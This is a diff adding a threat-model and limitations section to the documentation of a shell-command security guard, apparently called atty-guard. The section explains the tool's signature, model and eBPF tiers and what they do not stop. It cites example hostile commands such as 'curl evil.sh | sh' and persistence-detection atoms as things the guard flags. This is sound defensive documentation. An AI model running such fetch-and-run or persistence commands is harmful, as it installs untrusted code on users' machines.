@@ -558,6 +558,47 @@ via GitHub Actions cache poisoning).
 | systemd persistence | `systemctl --user enable`, `systemctl --user daemon-reload`, `loginctl enable-linger` — atoms catch each step of the daemon-install command sequence. |
 | V2-J auto-Block (opt-in) | With `[accumulator] block_threshold = 0.95`, multi-hit Shai-Hulud command chains (dead-man + credential read + persistence in one line) escalate from Warn to outright REFUSED. |
 
+## Threat model & limitations
+
+This stack is **defense-in-depth against accidental and opportunistic
+execution**, not a sandbox. Be honest with yourself about what it
+does and doesn't stop:
+
+- **It is not a sandbox or a jail.** A determined local attacker who
+  already has code execution as `$USER` can do damage that never
+  passes through atty's prompt (a cron job, a compromised dotfile, a
+  background daemon). atty-guard raises the cost and catches the
+  obvious shapes; it does not contain a hostile process.
+- **eBPF Block is scoped to the marked PID tree.** The LSM hook
+  refuses `execve()` for processes descended from a PID atty flagged
+  Critical. A *fresh* login (a new SSH session, a separate terminal,
+  a systemd service) starts a new tree that hasn't been classified —
+  it isn't covered until its own command trips a verdict. eBPF closes
+  the "fork away from the shell" gap, not "log in somewhere else."
+- **Tier-1 + atoms are signature-based.** Regex and the IOC atom
+  corpus catch *known* shapes. A novel payload that matches nothing
+  is Safe at Tier-1 — that's what Tier-2 (the SLM) and the eBPF
+  syscall tracepoints exist to backstop, and why the multi-hit
+  accumulator matters (several weak signals still escalate).
+- **Trust decisions are per-UID and coarse.** `[t]rust permanently`
+  hashes `category:matched` — trusting `curl … | sh` once trusts that
+  exact matched substring, not "this is a safe URL forever." Audit
+  `atty-guard trust list` periodically.
+- **No network egress filtering.** atty-guard inspects command lines,
+  not packets. It can flag `curl evil.sh | sh` at the prompt; it does
+  not stop a process that's already running from opening sockets.
+- **Without the daemon, you get Tier-1 only.** The proxy-side
+  `security_guard` module degrades gracefully to in-proc patterns if
+  the daemon is unreachable — useful, but it's the floor, not the
+  ceiling. The accumulator, OSV lookups, SLM, and eBPF all live
+  daemon-side.
+
+The honest framing: atty-guard is a high-value tripwire and a
+friction layer for the supply-chain and copy-paste threats most
+developers actually hit. Pair it with the usual hygiene (least
+privilege, reviewed dependencies, separate accounts for risky work)
+— don't treat a green `atty doctor` as a security guarantee.
+
 ## See also
 
 - `docs/security-guard-design.md` — full design rationale + V2-* tier table.
